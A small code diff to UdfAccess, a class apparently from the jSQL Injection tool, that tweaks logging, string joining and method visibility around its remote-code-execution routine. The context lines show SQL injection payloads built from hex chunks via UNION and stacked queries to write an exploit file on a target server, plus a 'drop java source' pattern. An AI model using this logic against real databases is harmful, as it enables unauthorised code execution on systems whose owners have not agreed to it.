@@ -55,8 +55,7 @@ public class UdfAccess {
 
     public void createExploitRce(ExploitMethod exploitMethod) throws JSqlException {
         if (!Arrays.asList(ExploitMethod.AUTO, ExploitMethod.QUERY_BODY).contains(exploitMethod)) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit method not implemented, use query body instead");
-            return;
+            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Exploit method not implemented, using query body instead");
         }
 
         var pattern = " ; drop java source \"%s\";";
@@ -189,7 +188,7 @@ public class UdfAccess {
         this.injectionModel.injectWithoutIndex(String.format(pattern,
             "union",
             "'',".repeat(nbIndexesFound),
-            String.join("", hexChunks),
+            String.join(StringUtils.EMPTY, hexChunks),
             pathRemoteFolder + nameExploitRandom
         ), "body#union-dump");
         if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
@@ -201,7 +200,7 @@ public class UdfAccess {
             this.injectionModel.injectWithoutIndex(String.format(pattern,
                 ";",
                 StringUtils.EMPTY,
-                String.join("", hexChunks),
+                String.join(StringUtils.EMPTY, hexChunks),
                 pathRemoteFolder + nameExploitRandom
             ), "body#stack-dump");
             if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
@@ -374,7 +373,7 @@ public class UdfAccess {
         }
     }
 
-    private String getResult(String query, String metadata) throws JSqlException {
+    public String getResult(String query, String metadata) throws JSqlException {
         var sourcePage = new String[]{ StringUtils.EMPTY };
         return new SuspendableGetRows(this.injectionModel).run(
             query,
